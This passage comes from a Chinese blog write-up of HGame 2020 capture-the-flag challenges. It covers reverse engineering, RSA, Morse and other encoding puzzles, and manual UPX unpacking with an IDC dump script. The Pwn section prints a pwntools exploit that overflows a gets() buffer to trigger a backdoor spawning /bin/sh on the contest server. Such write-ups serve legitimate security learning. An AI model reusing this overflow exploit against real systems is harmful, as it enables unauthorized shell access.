}</span><br><span class="line">     }</span><br><span class="line">   }</span><br><span class="line">   v6 = <span class="hljs-built_in">sub_140001900</span>(std::cout, <span class="hljs-string">"you are good at re"</span>);</span><br><span class="line">   std::basic_ostream&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>&lt;&lt;(v6, sub_140002830);</span><br></pre></td></tr></tbody></table></figure><p>最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag</p><p>尝试一下</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>]])</span><br><span class="line">b = np.linalg.inv(a)</span><br><span class="line"><span class="hljs-comment"># print(b)</span></span><br><span class="line"><span class="hljs-comment"># print(np.dot(a,b))</span></span><br><span class="line">c = np.array([[<span class="hljs-number">26727</span>, <span class="hljs-number">24941</span>, <span class="hljs-number">101</span>], [<span class="hljs-number">29285</span>, <span class="hljs-number">26995</span>, <span class="hljs-number">29551</span>], [<span class="hljs-number">29551</span>, <span class="hljs-number">25953</span>, <span class="hljs-number">29561</span>]])</span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line">d = np.dot(c, b)</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):</span><br><span class="line">        flag += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(d.item(i, j))) + <span class="hljs-string">'_'</span></span><br><span class="line">flag = <span class="hljs-string">'hgame{'</span> + flag[:-<span class="hljs-number">1</span>] + <span class="hljs-string">'}'</span></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>提交提示成功，猜测正确</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943}</span><br></pre></td></tr></tbody></table></figure><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h4><p>IDA反编译</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> *v7; <span class="hljs-comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="hljs-number">0x14</span>u);</span><br><span class="line">  <span class="hljs-built_in">alarm</span>(<span class="hljs-number">8u</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(_bss_start, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0xA0</span>u);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Let's 0O0o\\0O0!"</span>);</span><br><span class="line">  <span class="hljs-built_in">gets</span>(&amp;s);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(<span class="hljs-string">"0O0o"</span>, &amp;v5, <span class="hljs-number">7u</span>) )</span><br><span class="line">    <span class="hljs-built_in">backdoor</span>();</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//backdoor</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">backdoor</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">system</span>(<span class="hljs-string">"/bin/sh"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">io = remote(<span class="hljs-string">"47.103.214.163"</span>,<span class="hljs-string">"20000"</span>)</span><br><span class="line"><span class="hljs-comment">#io=process("./Hard_AAAAA")</span></span><br><span class="line">io.recvuntil(<span class="hljs-string">"Let's 0O0o\\0O0!"</span>)</span><br><span class="line">payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">123</span>+<span class="hljs-string">'0O0o\0O0'</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>最终得到flag：</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{0OoO0oo0O0Oo}</span><br></pre></td></tr></tbody></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h4><p>简单的RSA解密，p和q都已经分解出来了，其它的没什么难度</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcdext</span>(<span class="hljs-params">a, b</span>):</span></span><br><span class="line">    <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">    a: 模的取值</span></span><br><span class="line"><span class="hljs-string">    b: 想求逆的值</span></span><br><span class="line"><span class="hljs-string">    """</span></span><br><span class="line">    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, a</span><br><span class="line">    x, y, gcd = gcdext(b, a % b)</span><br><span class="line">    <span class="hljs-keyword">return</span> y, x - a // b * y, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="hljs-number">275698465082361070145173688411496311542172902608559859019841</span></span><br><span class="line">p = <span class="hljs-number">681782737450022065655472455411</span></span><br><span class="line">q = <span class="hljs-number">675274897132088253519831953441</span></span><br><span class="line">e = <span class="hljs-number">13</span></span><br><span class="line">n = p * q</span><br><span class="line"><span class="hljs-comment"># print(k)</span></span><br><span class="line">fai = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)</span><br><span class="line">(d, k, g) = gcdext(e, fai)</span><br><span class="line"><span class="hljs-comment"># print(fai)</span></span><br><span class="line"><span class="hljs-comment"># print(k)</span></span><br><span class="line"><span class="hljs-comment"># print(m)</span></span><br><span class="line">m = <span class="hljs-built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="hljs-comment"># print(m)</span></span><br><span class="line">f = m.to_bytes(<span class="hljs-number">22</span>, byteorder=<span class="hljs-string">'big'</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(f)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>直接求解出来flag</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{t3Xt6O0k_R5A!!!}</span><br></pre></td></tr></tbody></table></figure><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h4><p>首先看到一长串似曾相识的东西</p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</span><br></pre></td></tr></tbody></table></figure><p>像是摩斯电码base64加密之后的东西</p><p>所以base64解码之后</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</span><br></pre></td></tr></tbody></table></figure><p>果然是摩斯电码，然后解摩斯电码</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">CODE = {<span class="hljs-string">'A'</span>: <span class="hljs-string">'.-'</span>, <span class="hljs-string">'B'</span>: <span class="hljs-string">'-...'</span>, <span class="hljs-string">'C'</span>: <span class="hljs-string">'-.-.'</span>,</span><br><span class="line">        <span class="hljs-string">'D'</span>: <span class="hljs-string">'-..'</span>, <span class="hljs-string">'E'</span>: <span class="hljs-string">'.'</span>, <span class="hljs-string">'F'</span>: <span class="hljs-string">'..-.'</span>,</span><br><span class="line">        <span class="hljs-string">'G'</span>: <span class="hljs-string">'--.'</span>, <span class="hljs-string">'H'</span>: <span class="hljs-string">'....'</span>, <span class="hljs-string">'I'</span>: <span class="hljs-string">'..'</span>,</span><br><span class="line">        <span class="hljs-string">'J'</span>: <span class="hljs-string">'.---'</span>, <span class="hljs-string">'K'</span>: <span class="hljs-string">'-.-'</span>, <span class="hljs-string">'L'</span>: <span class="hljs-string">'.-..'</span>,</span><br><span class="line">        <span class="hljs-string">'M'</span>: <span class="hljs-string">'--'</span>, <span class="hljs-string">'N'</span>: <span class="hljs-string">'-.'</span>, <span class="hljs-string">'O'</span>: <span class="hljs-string">'---'</span>,</span><br><span class="line">        <span class="hljs-string">'P'</span>: <span class="hljs-string">'.--.'</span>, <span class="hljs-string">'Q'</span>: <span class="hljs-string">'--.-'</span>, <span class="hljs-string">'R'</span>: <span class="hljs-string">'.-.'</span>,</span><br><span class="line">        <span class="hljs-string">'S'</span>: <span class="hljs-string">'...'</span>, <span class="hljs-string">'T'</span>: <span class="hljs-string">'-'</span>, <span class="hljs-string">'U'</span>: <span class="hljs-string">'..-'</span>,</span><br><span class="line">        <span class="hljs-string">'V'</span>: <span class="hljs-string">'...-'</span>, <span class="hljs-string">'W'</span>: <span class="hljs-string">'.--'</span>, <span class="hljs-string">'X'</span>: <span class="hljs-string">'-..-'</span>,</span><br><span class="line">        <span class="hljs-string">'Y'</span>: <span class="hljs-string">'-.--'</span>, <span class="hljs-string">'Z'</span>: <span class="hljs-string">'--..'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-string">'0'</span>: <span class="hljs-string">'-----'</span>, <span class="hljs-string">'1'</span>: <span class="hljs-string">'.----'</span>, <span class="hljs-string">'2'</span>: <span class="hljs-string">'..---'</span>,</span><br><span class="line">        <span class="hljs-string">'3'</span>: <span class="hljs-string">'...--'</span>, <span class="hljs-string">'4'</span>: <span class="hljs-string">'....-'</span>, <span class="hljs-string">'5'</span>: <span class="hljs-string">'.....'</span>,</span><br><span class="line">        <span class="hljs-string">'6'</span>: <span class="hljs-string">'-....'</span>, <span class="hljs-string">'7'</span>: <span class="hljs-string">'--...'</span>, <span class="hljs-string">'8'</span>: <span class="hljs-string">'---..'</span>,</span><br><span class="line">        <span class="hljs-string">'9'</span>: <span class="hljs-string">'----.'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-string">'.'</span>: <span class="hljs-string">'.-.-.-'</span>, <span class="hljs-string">':'</span>: <span class="hljs-string">'---...'</span>, <span class="hljs-string">','</span>: <span class="hljs-string">'--..--'</span>, <span class="hljs-string">';'</span>: <span class="hljs-string">'-.-.-.'</span>,</span><br><span class="line">        <span class="hljs-string">'?'</span>: <span class="hljs-string">'..--..'</span>, <span class="hljs-string">'='</span>: <span class="hljs-string">'-...-'</span>, <span class="hljs-string">'\''</span>: <span class="hljs-string">'.----.'</span>, <span class="hljs-string">'/'</span>: <span class="hljs-string">'-..-.'</span>,</span><br><span class="line">        <span class="hljs-string">'!'</span>: <span class="hljs-string">'-.-.--'</span>, <span class="hljs-string">'-'</span>: <span class="hljs-string">'-....-'</span>, <span class="hljs-string">'_'</span>: <span class="hljs-string">'..--.-'</span>, <span class="hljs-string">'"'</span>: <span class="hljs-string">'.-..-.'</span>,</span><br><span class="line">        <span class="hljs-string">'('</span>: <span class="hljs-string">'-.--.'</span>, <span class="hljs-string">')'</span>: <span class="hljs-string">'-.--.-'</span>, <span class="hljs-string">'$'</span>: <span class="hljs-string">'...-..-'</span>, <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'.-...'</span>,</span><br><span class="line">        <span class="hljs-string">'@'</span>: <span class="hljs-string">'.--.-.'</span></span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Decode</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span></span><br><span class="line">    Decode_value = CODE.keys()</span><br><span class="line">    Decode_key = CODE.values()</span><br><span class="line">    Decode_dict = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(Decode_key, Decode_value))</span><br><span class="line"></span><br><span class="line">    text = <span class="hljs-string">''</span></span><br><span class="line">    msg = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">' '</span>)</span><br><span class="line">    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> msg:</span><br><span class="line">        <span class="hljs-keyword">if</span> s <span class="hljs-keyword">in</span> Decode_dict.keys():</span><br><span class="line">            text += Decode_dict[s]</span><br><span class="line">    <span class="hljs-keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(Decode(<span class="hljs-string">'.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--'</span>))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame：</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{W3LC0ME_TO_2020_HGAM3}</span><br></pre></td></tr></tbody></table></figure><h4 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h4><p>下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815</p><p>解压出来打开flag.txt，内容如下：</p><figure class="highlight taggerscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">\u</span>68<span class="hljs-symbol">\u</span>67<span class="hljs-symbol">\u</span>61<span class="hljs-symbol">\u</span>6d<span class="hljs-symbol">\u</span>65<span class="hljs-symbol">\u</span>7b<span class="hljs-symbol">\u</span>44<span class="hljs-symbol">\u</span>6f<span class="hljs-symbol">\u</span>5f<span class="hljs-symbol">\u</span>79<span class="hljs-symbol">\u</span>30<span class="hljs-symbol">\u</span>75<span class="hljs-symbol">\u</span>5f<span class="hljs-symbol">\u</span>4b<span class="hljs-symbol">\u</span>6e<span class="hljs-symbol">\u</span>4f<span class="hljs-symbol">\u</span>57<span class="hljs-symbol">\u</span>5f<span class="hljs-symbol">\u</span>75<span class="hljs-symbol">\u</span>4e<span class="hljs-symbol">\u</span>69<span class="hljs-symbol">\u</span>43<span class="hljs-symbol">\u</span>30<span class="hljs-symbol">\u</span>64<span class="hljs-symbol">\u</span>33<span class="hljs-symbol">\u</span>3f<span class="hljs-symbol">\u</span>7d</span><br></pre></td></tr></tbody></table></figure><p>unicode编码，解码得：</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{Do_y0u_KnOW_uNiC0d3?}</span><br></pre></td></tr></tbody></table></figure><h4 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h4><p>压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下：</p><figure class="highlight vim hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rdjxfwxjfimkn <span class="hljs-keyword">z</span>,<span class="hljs-keyword">ts</span> wntzi xtjrwm xsfjt jm ywt rtntwhf <span class="hljs-keyword">f</span> <span class="hljs-keyword">y</span>   h jnsxf qjFjf jnb  rg fiyykwtbsnkm <span class="hljs-keyword">tm</span>  <span class="hljs-keyword">xa</span> jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.</span><br><span class="line"></span><br><span class="line">JRFVJYFZVRUAGMAI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Three fences <span class="hljs-keyword">first</span>, Five Caesar <span class="hljs-keyword">next</span>. English sentense <span class="hljs-keyword">first</span>,  zip password <span class="hljs-keyword">next</span>.</span><br></pre></td></tr></tbody></table></figure><p>根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码</p><figure class="highlight livescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Many years later <span class="hljs-keyword">as</span> he faced the firing squad, Colonel Aureliano Buendia was <span class="hljs-keyword">to</span> remember <span class="hljs-literal">that</span> distant afternoon <span class="hljs-keyword">when</span> his father took him <span class="hljs-keyword">to</span> discover ice.</span><br><span class="line"></span><br><span class="line">EAVMUBAQHQMVEPDT</span><br></pre></td></tr></tbody></table></figure><p>解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{3Nc0dInG_@lL_iN_0Ne!}</span><br></pre></td></tr></tbody></table></figure><p>这题有各种各样的编码，还不错</p><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="RE-1"><a href="#RE-1" class="headerlink" title="RE"></a>RE</h3><h4 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h4><p>明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳<br>由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）<br>脱壳的过程借鉴<a href="https://www.52pojie.cn/thread-1048649-1-1.html">https://www.52pojie.cn/thread-1048649-1-1.html</a><br>很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PT_LOAD              1</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PT_DYNAMIC           2</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">auto</span> ImageBase,StartImg,EndImg;</span><br><span class="line">  <span class="hljs-keyword">auto</span> e_phoff;</span><br><span class="line">  <span class="hljs-keyword">auto</span> e_phnum,p_offset;</span><br><span class="line">  <span class="hljs-keyword">auto</span> i,dumpfile;</span><br><span class="line">  ImageBase=<span class="hljs-number">0x400000</span>;</span><br><span class="line">  StartImg=<span class="hljs-number">0x400000</span>;</span><br><span class="line">  EndImg=<span class="hljs-number">0x0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Dword</span>(ImageBase)==<span class="hljs-number">0x7f454c46</span> || <span class="hljs-built_in">Dword</span>(ImageBase)==<span class="hljs-number">0x464c457f</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span>(dumpfile=<span class="hljs-built_in">fopen</span>(<span class="hljs-string">"D:\\dumpfile"</span>,<span class="hljs-string">"wb"</span>))</span><br><span class="line">    {</span><br><span class="line">      e_phoff=ImageBase+<span class="hljs-built_in">Qword</span>(ImageBase+<span class="hljs-number">0x20</span>);</span><br><span class="line">      <span class="hljs-built_in">Message</span>(<span class="hljs-string">"e_phoff = 0x%x\n"</span>, e_phoff);</span><br><span class="line">      e_phnum=<span class="hljs-built_in">Word</span>(ImageBase+<span class="hljs-number">0x38</span>);</span><br><span class="line">      <span class="hljs-built_in">Message</span>(<span class="hljs-string">"e_phnum = 0x%x\n"</span>, e_phnum);</span><br><span class="line">      <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;e_phnum;i++)</span><br><span class="line">      {</span><br><span class="line">         <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Dword</span>(e_phoff)==PT_LOAD || <span class="hljs-built_in">Dword</span>(e_phoff)==PT_DYNAMIC)</span><br><span class="line">         { </span><br><span class="line">p_offset=<span class="hljs-built_in">Qword</span>(e_phoff+<span class="hljs-number">0x8</span>);</span><br><span class="line">            StartImg=<span class="hljs-built_in">Qword</span>(e_phoff+<span class="hljs-number">0x10</span>);</span><br><span class="line">            EndImg=StartImg+<span class="hljs-built_in">Qword</span>(e_phoff+<span class="hljs-number">0x28</span>);</span><br><span class="line">            <span class="hljs-built_in">Message</span>(<span class="hljs-string">"start = 0x%x, end = 0x%x, offset = 0x%x\n"</span>, StartImg, EndImg, p_offset);</span><br><span class="line">            <span class="hljs-built_in">dump</span>(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">            <span class="hljs-built_in">Message</span>(<span class="hljs-string">"dump segment %d ok.\n"</span>,i);</span><br><span class="line">         }    </span><br><span class="line">         e_phoff=e_phoff+<span class="hljs-number">0x38</span>;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="hljs-built_in">fseek</span>(dumpfile,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0</span>);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      <span class="hljs-built_in">fseek</span>(dumpfile,<span class="hljs-number">0x28</span>,<span class="hljs-number">0</span>);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">  </span><br><span class="line">      <span 